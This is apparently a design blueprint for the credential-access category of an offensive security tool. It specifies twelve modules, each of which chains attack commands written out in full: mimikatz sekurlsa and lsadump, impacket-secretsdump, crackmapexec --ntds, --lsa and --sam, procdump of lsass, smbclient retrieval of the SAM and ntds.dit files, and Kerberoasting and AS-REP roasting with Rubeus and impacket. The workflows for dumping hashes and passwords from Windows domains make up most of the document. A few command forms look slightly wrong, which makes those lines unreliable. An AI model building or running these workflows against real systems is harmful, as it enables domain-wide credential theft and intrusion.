# Credential Access — Category Blueprint

**Category:** `CREDENTIAL_ACCESS` | **Slug:** `credaccess` | **Tools Dir:** `~/jabber/jabber-tools/credaccess/`
**Package:** `com.jabber.jabber.modules.credential` | **Group:** Privilege & Identity

---

## ToolManager: `credaccess/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `impacket` | `impacket-secretsdump` | pip | `impacket-secretsdump --help` | `pip_install` |
| `mimikatz` | `mimikatz.exe` | `gentilkiwi/mimikatz` | N/A (Windows) | `github_release` |
| `crackmapexec` | `crackmapexec` | pip | `crackmapexec --version` | `pip_install` |
| `ldapsearch` | `ldapsearch` | apt (ldap-utils) | `ldapsearch -V` | `apt_install` |
| `rpcclient` | `rpcclient` | apt | `rpcclient --version` | `apt_install` |
| `smbclient` | `smbclient` | apt | `smbclient --version` | `apt_install` |
| `nmap` | `nmap` | apt | `nmap --version` | `apt_install` |
| `procdump` | `procdump.exe` | Microsoft/Sysinternals | N/A | system |
| `ssh-keygen` | `ssh-keygen` | system (openssh) | `ssh-keygen -V` | system |
| `rubeus` | `rubeus.exe` | `GhostPack/Rubeus` | N/A | `github_release` |

---

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Credential Access** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between operations.
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading results and logs.
4. **Live Terminal Stream**: A real-time stdout/stderr streaming component for operational transparency.
5. **Interactive Dashboard**: Real-time display of extracted data, payloads, or process progress.

---

---

## Modules

### 1. Secrets Dumper
**ID:** `cred-secrets-dump` | **Risk:** CRITICAL | **File:** `SecretsDumperModule.java`
**Tools:** `impacket`, `crackmapexec`, `smbclient`, `nmap`, `mimikatz`

#### Execution Modes:

- **`REMT`** (Short Name: `REMT`)
    - **Purpose**: Comprehensive dumping of secrets from a remote target system.
    - **Input Schema**: `{ target: String, user: String, hash: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-secretsdump -hashes <hash> <user>@<target>` (Core Dumping)
        2. `crackmapexec smb <target> -u <user> -H <hash> --lsa` (LSA Audit)
        3. `smbclient -L <target> -U <user>%<hash>` (Share Discovery)
        4. `nmap -p 445 --script smb-os-discovery <target>` (System Profiling)
        5. `mimikatz.exe "lsadump::sam /user:<user> /ntlm:<hash>"` (Local Logic Simulation)
    - **Execution Flow**: Core Dumping -> LSA Audit -> Share Discovery -> System Profiling -> Local Simulation.
    - **Output Generation & Artifacts**:
        - `reports/outputs/REMOTE_[Timestamp]_secretsdump.txt`: Comprehensive dump of hashes and secrets from the target.
        - `reports/artifacts/REMOTE_[Timestamp]_lsa_audit.json`: Detailed report on LSA secrets and configuration.
        - `reports/analysis/REMOTE_[Timestamp]_system_profile.xml`: Nmap system profiling and OS discovery results.

- **`SAM`** (Short Name: `SAM`)
    - **Purpose**: Specific extraction of SAM hashes for local account recovery.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `crackmapexec smb <target> -u <user> -p <pass> --sam` (Core SAM Dump)
        2. `impacket-secretsdump -sam sam.hive -system system.hive LOCAL` (Local SAM Extraction)
        3. `smbclient // <target>/ADMIN$ -U <user>%<pass> -c "get system32\config\SAM"` (Manual Extraction)
        4. `nmap -p 445 <target>` (Service Liveness)
        5. `mimikatz.exe "lsadump::sam"` (Active Memory Audit)
    - **Execution Flow**: Core SAM Dump -> Local Extraction -> Manual Extraction -> Liveness -> Memory Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SAM_[Timestamp]_sam_hashes.txt`: Extracted SAM hashes for local accounts.
        - `reports/artifacts/SAM_[Timestamp]_sam_hive.zip`: Compressed SAM and SYSTEM hive files for offline audit.
        - `reports/analysis/SAM_[Timestamp]_memory_audit.json`: Mimikatz telemetry from the active memory audit.

---

### 2. NTLM Hash Dump
**ID:** `cred-ntlm-dump` | **Risk:** HIGH | **File:** `NTLMHashDumpModule.java`
**Tools:** `impacket`, `crackmapexec`, `mimikatz`, `rpcclient`, `nmap`

#### Execution Modes:

- **`LIVE`** (Short Name: `LIVE`)
    - **Purpose**: Real-time extraction of NTLM hashes from active logon sessions.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `mimikatz "privilege::debug" "sekurlsa::logonpasswords"` (Core extraction)
        2. `crackmapexec smb <target> -u <user> -p <pass> --ntds` (Domain Extraction)
        3. `impacket-secretsdump <domain>/<user>:<pass>@<target>` (Remote Dump)
        4. `rpcclient -U <user>%<pass> <target> -c "queryuser <user>"` (User Audit)
        5. `nmap -p 445 <target>` (Liveness Audit)
    - **Execution Flow**: Core Extraction -> Domain Extraction -> Remote Dump -> User Audit -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/LIVE_[Timestamp]_logon_passwords.txt`: Captured cleartext passwords and hashes from memory.
        - `reports/artifacts/LIVE_[Timestamp]_ntds_hashes.txt`: Domain-wide NTLM hashes extracted from active sessions.
        - `reports/analysis/LIVE_[Timestamp]_user_audit.json`: Detailed report on the identified user context and privileges.

- **`PASS`** (Short Name: `PASS`)
    - **Purpose**: Non-intrusive discovery of hash-related artifacts.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap --script smb-os-discovery <target>` (System Audit)
        2. `rpcclient -U "" -N <target> -c "enumdomusers"` (User Enumeration)
        3. `impacket-rpcdump <target>` (RPC Service Mapping)
        4. `crackmapexec smb <target> --shares` (Share Audit)
        5. `mimikatz --version` (Binary Audit)
    - **Execution Flow**: System Audit -> User Enum -> RPC Mapping -> Share Audit -> Binary Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/PASS_[Timestamp]_user_inventory.json`: Comprehensive inventory of domain users and groups.
        - `reports/artifacts/PASS_[Timestamp]_rpc_mapping.txt`: Map of RPC services and potential credential vectors.
        - `reports/analysis/PASS_[Timestamp]_system_audit.xml`: Nmap passive audit of the target system.

---

### 3. SAM Dump
**ID:** `cred-sam-dump` | **Risk:** HIGH | **File:** `SamDumpModule.java`
**Tools:** `impacket`, `mimikatz`, `crackmapexec`, `smbclient`, `nmap`

#### Execution Modes:

- **`DUMP`** (Short Name: `DUMP`)
    - **Purpose**: Extract local SAM hashes from the Windows registry and hive files.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` (Core SAM Extraction)
        2. `mimikatz "lsadump::sam"` (Active Memory SAM Audit)
        3. `crackmapexec smb <target> -u <user> -p <pass> --sam` (Automated SAM Dump)
        4. `smbclient // <target>/ADMIN$ -U <user>%<pass> -c "get system32\config\SAM"` (Manual Hive Fetch)
        5. `nmap -p 445 <target>` (Service Liveness)
    - **Execution Flow**: Core Extraction -> Memory Audit -> Automated Dump -> Hive Fetch -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DUMP_[Timestamp]_sam_hashes.txt`: Extracted local SAM hashes.
        - `reports/artifacts/DUMP_[Timestamp]_sam_hive.zip`: Compressed SAM and SYSTEM hives for offline audit.
        - `reports/analysis/DUMP_[Timestamp]_sam_audit.json`: Mimikatz telemetry from the SAM memory audit.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 4. LSASS Memory Dump
**ID:** `cred-lsass` | **Risk:** CRITICAL | **File:** `LsassDumpModule.java`
**Tools:** `mimikatz`, `procdump`, `crackmapexec`, `impacket`, `nmap`

#### Execution Modes:

- **`DUMP`** (Short Name: `DUMP`)
    - **Purpose**: Create a memory dump of the LSASS process for offline credential recovery.
    - **Input Schema**: `{ pid: int, output_path: String }`
    - **Multi-Tool Command Logic**:
        1. `procdump.exe -ma lsass.exe <output_path>` (Core Dumping)
        2. `mimikatz "privilege::debug" "sekurlsa::minidump <output_path>"` (Mimikatz Extract)
        3. `crackmapexec smb 127.0.0.1 -u local -p local --lsass` (Automated Dump)
        4. `impacket-secretsdump -lsass <output_path> LOCAL` (Alternative Extract)
        5. `nmap -p 445 127.0.0.1` (System Audit)
    - **Execution Flow**: Core Dumping -> Mimikatz Extract -> Automated Dump -> Alternative Extract -> System Audit.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/DUMP_[Timestamp]_lsass_dump.dmp`: Core memory dump of the LSASS process.
        - `reports/outputs/DUMP_[Timestamp]_extracted_creds.txt`: Credentials and hashes extracted from the LSASS dump.
        - `reports/analysis/DUMP_[Timestamp]_system_audit.xml`: Nmap system audit and OS discovery report.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 5. NTDS.dit Dump
**ID:** `cred-ntds` | **Risk:** CRITICAL | **File:** `NTDSDitDumpModule.java`
**Tools:** `impacket`, `smbclient`, `crackmapexec`, `nmap`, `ldapsearch`

#### Execution Modes:

- **`EXTR`** (Short Name: `EXTR`)
    - **Purpose**: Extract the Active Directory database (NTDS.dit) for domain-wide credential dumping.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL` (Core Extraction)
        2. `crackmapexec smb <target> -u <user> -p <pass> --ntds` (Automated Extraction)
        3. `smbclient // <target>/C$ -U <user>%<pass> -c "get Windows\NTDS\ntds.dit"` (Manual Fetch)
        4. `nmap -p 445 <target>` (Service Audit)
        5. `ldapsearch -h <target> -x -b "dc=..."` (Schema Discovery)
    - **Execution Flow**: Core Extraction -> Automated Extraction -> Manual Fetch -> Service Audit -> Schema Discovery.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXTR_[Timestamp]_ntds_hashes.txt`: Domain-wide NTLM hashes extracted from the NTDS database.
        - `reports/artifacts/EXTR_[Timestamp]_ntds_hive.zip`: Compressed NTDS.dit and SYSTEM hive for offline audit.
        - `reports/analysis/EXTR_[Timestamp]_schema_discovery.json`: Detailed map of the Active Directory schema.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 6. Registry Secrets Dump
**ID:** `cred-registry` | **Risk:** HIGH | **File:** `RegistrySecretsModule.java`
**Tools:** `impacket`, `crackmapexec`, `smbclient`, `rpcclient`, `nmap`

#### Execution Modes:

- **`DUMP`** (Short Name: `DUMP`)
    - **Purpose**: Extract cached credentials and LSA secrets from the Windows registry.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `crackmapexec smb <target> -u <user> -p <pass> --lsa` (Core Registry Dump)
        2. `impacket-secretsdump -lsa <user>@<target>` (Alternative Dump)
        3. `rpcclient -U <user>%<pass> <target> -c "querydominfo"` (RPC Audit)
        4. `smbclient // <target>/ADMIN$ -U <user>%<pass> -c "ls"` (Admin Access Check)
        5. `nmap -p 445 <target>` (Liveness Audit)
    - **Execution Flow**: Core Dump -> Alternative Dump -> RPC Audit -> Access Check -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DUMP_[Timestamp]_registry_secrets.txt`: Secrets and cached credentials extracted from the registry.
        - `reports/artifacts/DUMP_[Timestamp]_rpc_audit.json`: Technical report on RPC system information.
        - `reports/analysis/DUMP_[Timestamp]_access_verification.txt`: Log of administrative share access verification.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 7. DPAPI Decryptor
**ID:** `cred-dpapi` | **Risk:** MEDIUM | **File:** `DPAPIDecryptModule.java`
**Tools:** `impacket`, `mimikatz`, `lazagne`, `find`, `python3`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Enumerate DPAPI master keys and protected blobs.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `mimikatz "dpapi::masterkey /in:C:\Users\...\Protect"` (Core Key Discovery)
        2. `find / -name "MasterKey" 2>/dev/null` (Global Discovery)
        3. `lazagne windows` (Automated Windows Audit)
        4. `impacket-dpapi --help` (Binary Audit)
        5. `python3 --version` (Runtime Audit)
    - **Execution Flow**: Core Key Discovery -> Global Discovery -> Automated Audit -> Binary Audit -> Runtime Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_dpapi_masterkeys.txt`: List of identified DPAPI master keys and GUIDs.
        - `reports/artifacts/SCAN_[Timestamp]_protect_files.zip`: Collection of DPAPI protected files and blobs.
        - `reports/analysis/SCAN_[Timestamp]_binary_audit.json`: Status and version audit of DPAPI tools.

- **`DECR`** (Short Name: `DECR`)
    - **Purpose**: Decrypt DPAPI-protected sensitive data using recovered master keys.
    - **Input Schema**: `{ guid: String, masterkey: String, blob_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `impacket-dpapi -guid <guid> -masterkey <masterkey>` (Core Decryption)
        2. `mimikatz "dpapi::blob /in:<blob_path> /masterkey:<masterkey>"` (Mimikatz Decrypt)
        3. `python3 decrypt_blob.py --key <masterkey> --blob <blob_path>` (Custom Decrypt)
        4. `strings <blob_path>` (Blob Context)
        5. `find <blob_path> -ls` (Blob Profile)
    - **Execution Flow**: Core Decryption -> Mimikatz Decrypt -> Custom Decrypt -> Blob Context -> Blob Profile.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DECR_[Timestamp]_decrypted_data.txt`: Successfully decrypted DPAPI data artifacts.
        - `reports/artifacts/DECR_[Timestamp]_mimikatz_telemetry.log`: Mimikatz execution log for DPAPI decryption.
        - `reports/analysis/DECR_[Timestamp]_blob_profile.json`: Technical profile of the decrypted DPAPI blob.

---

### 8. Kerberos TGT Req
**ID:** `cred-tgt` | **Risk:** CRITICAL | **File:** `KerberosTGTModule.java`
**Tools:** `impacket`, `rubeus`, `ldapsearch`, `nmap`, `kinit`

#### Execution Modes:

- **`REQT`** (Short Name: `REQT`)
    - **Purpose**: Request a Kerberos TGT for a user account to establish domain authentication.
    - **Input Schema**: `{ domain: String, user: String, pass: Password, dc_ip: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-getTGT <domain>/<user>:<pass> -dc-ip <dc_ip>` (Core TGT Request)
        2. `rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain> /dc:<dc_ip>` (Rubeus Request)
        3. `kinit <user>@<domain>` (System TGT Request)
        4. `nmap -p 88 <dc_ip>` (KDC Port Audit)
        5. `ldapsearch -h <dc_ip> -x -D "<user>@<domain>" -w "<pass>"` (Connectivity Audit)
    - **Execution Flow**: Core TGT -> Rubeus -> System TGT -> Port Audit -> Connectivity.
    - **Output Generation & Artifacts**:
        - `reports/payloads/REQT_[Timestamp]_tgt_ticket.kirbi`: Successfully requested Kerberos TGT file.
        - `reports/outputs/REQT_[Timestamp]_kinit_verification.txt`: Log of the system-level TGT verification.
        - `reports/analysis/REQT_[Timestamp]_kdc_audit.xml`: Nmap audit of the Domain Controller's Kerberos service.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 9. AS-REP Roaster
**ID:** `cred-asrep-roast` | **Risk:** HIGH | **File:** `ASREPRoasterModule.java`
**Tools:** `impacket`, `crackmapexec`, `nmap`, `ldapsearch`, `hashcat`

#### Execution Modes:

- **`ROST`** (Short Name: `ROST`)
    - **Purpose**: Enumerate and roast accounts with "Do not require Kerberos preauthentication" enabled.
    - **Input Schema**: `{ target: String, domain: String, user: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-GetNPUsers <domain>/ -usersfile <user_file> -dc-ip <target>` (Core Roasting)
        2. `crackmapexec ldap <target> -u <user> -p '' --asrep-roast` (Automated Roast)
        3. `ldapsearch -h <target> -x -b "dc=..." "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"` (Manual Discovery)
        4. `nmap -p 88 <target>` (KDC Audit)
        5. `hashcat -m 18200 --help` (Cracker Readiness)
    - **Execution Flow**: Core Roasting -> Automated Roast -> Discovery -> KDC Audit -> Readiness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ROAST_[Timestamp]_asrep_hashes.txt`: Extracted AS-REP hashes for offline cracking.
        - `reports/artifacts/ROAST_[Timestamp]_vulnerable_users.json`: List of identified vulnerable accounts.
        - `reports/analysis/ROAST_[Timestamp]_kdc_status.xml`: Nmap audit of the targeted KDC.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 10. Kerberoast Attacker
**ID:** `cred-kerberoast` | **Risk:** HIGH | **File:** `KerberoastAttackerModule.java`
**Tools:** `impacket`, `crackmapexec`, `rubeus`, `nmap`, `ldapsearch`

#### Execution Modes:

- **`ROST`** (Short Name: `ROST`)
    - **Purpose**: Request TGS tickets for SPNs and extract hashes for offline cracking.
    - **Input Schema**: `{ target: String, domain: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `impacket-GetUserSPNs -request -dc-ip <target> <domain>/<user>:<pass>` (Core Kerberoasting)
        2. `rubeus.exe kerberoast /user:<user> /domain:<domain> /dc:<target>` (Rubeus Roast)
        3. `crackmapexec ldap <target> -u <user> -p <pass> --kerberoasting` (Automated Roast)
        4. `ldapsearch -h <target> -x -D "<user>@<domain>" -w "<pass>" -b "dc=..." "(servicePrincipalName=*)"` (SPN Discovery)
        5. `nmap -p 88 <target>` (KDC Check)
    - **Execution Flow**: Core Kerberoasting -> Rubeus Roast -> Automated Roast -> SPN Discovery -> KDC Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ROAST_[Timestamp]_tgs_hashes.txt`: Extracted TGS-REP hashes for service accounts.
        - `reports/artifacts/ROAST_[Timestamp]_spn_inventory.json`: Inventory of discovered SPNs and associated users.
        - `reports/analysis/ROAST_[Timestamp]_kerberos_telemetry.log`: Log of the Kerberos request and ticket extraction process.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 11. KerberoastTGSRequesterModule
**ID:** `cred-tgs-request` | **Risk:** MEDIUM | **File:** `KerberoastTGSRequesterModule.java`
**Tools:** `impacket`, `rubeus`, `kinit`, `nmap`, `rpcclient`

#### Execution Modes:

- **`REQS`** (Short Name: `REQS`)
    - **Purpose**: Targeted TGS ticket requests for specific service principals.
    - **Input Schema**: `{ spn: String, dc_ip: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-GetUserSPNs -request -dc-ip <dc_ip> -target-user <spn>` (Targeted Request)
        2. `rubeus.exe asktgs /service:<spn> /dc:<dc_ip>` (Rubeus TGS)
        3. `kinit -S <spn>` (System TGS Request)
        4. `nmap -p 88 <dc_ip>` (Service Audit)
        5. `rpcclient -U "" -N <dc_ip> -c "srvinfo"` (RPC Context)
    - **Execution Flow**: Targeted Request -> Rubeus TGS -> System TGS -> Service Audit -> RPC Context.
    - **Output Generation & Artifacts**:
        - `reports/payloads/REQUEST_[Timestamp]_tgs_ticket.kirbi`: Successfully requested TGS ticket file.
        - `reports/outputs/REQUEST_[Timestamp]_tgs_verification.txt`: Log of the system-level TGS verification.
        - `reports/analysis/REQUEST_[Timestamp]_rpc_context.json`: Server info and domain context from RPC.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 12. TGTRequesterModule
**ID:** `cred-tgt-request` | **Risk:** MEDIUM | **File:** `TGTRequesterModule.java`
**Tools:** `impacket`, `rubeus`, `kinit`, `nmap`, `ldapsearch`

#### Execution Modes:

- **`REQS`** (Short Name: `REQS`)
    - **Purpose**: Authenticated TGT requests via various protocols (Kerberos, LDAP).
    - **Input Schema**: `{ domain: String, user: String, pass: Password, dc_ip: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-getTGT <domain>/<user>:<pass> -dc-ip <dc_ip>` (Core TGT)
        2. `rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain>` (Rubeus TGT)
        3. `kinit <user>@<domain>` (System TGT)
        4. `ldapsearch -h <dc_ip> -x -D "<user>@<domain>" -w "<pass>"` (LDAP Auth)
        5. `nmap -p 88 <dc_ip>` (KDC Port Check)
    - **Execution Flow**: Core TGT -> Rubeus TGT -> System TGT -> LDAP Auth -> Port Check.
    - **Output Generation & Artifacts**:
        - `reports/payloads/REQUEST_[Timestamp]_tgt_ticket.kirbi`: Successfully requested TGT ticket file.
        - `reports/outputs/REQUEST_[Timestamp]_auth_verification.txt`: Log of the multi-protocol authentication verification.
        - `reports/analysis/REQUEST_[Timestamp]_kdc_status.xml`: Nmap audit of the Domain Controller's Kerberos service.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

